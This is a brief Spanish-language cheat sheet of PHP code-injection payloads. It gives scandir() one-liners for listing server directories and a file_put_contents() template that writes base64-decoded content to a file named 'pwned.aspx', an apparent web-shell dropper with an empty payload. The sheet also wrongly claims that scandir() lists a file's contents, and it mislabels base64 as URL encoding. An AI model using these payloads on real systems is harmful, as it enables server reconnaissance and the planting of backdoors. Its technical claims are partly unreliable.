
**PHP INJECTION LIST CONTENT**
```php
<?php print_r(scandir(".")); ?> # LISTAR CONTENIDO DEL DIRECTORIO ACTUAL.
<?php print_r(scandir("../")); ?> # LISTAR CONTENIDO DEL DIRECTORIO ANTERIOR.
<?php print_r(scandir("../FILE.conf")); ?> # LISTAR EL CONTENIDO DE UN ARCHIVO.
```

**CARGAR CONTENIDO URLENCODEADO POR PHP**
```php
<?php file_put_contents("pwned.aspx", base64_decode("")); ?>
```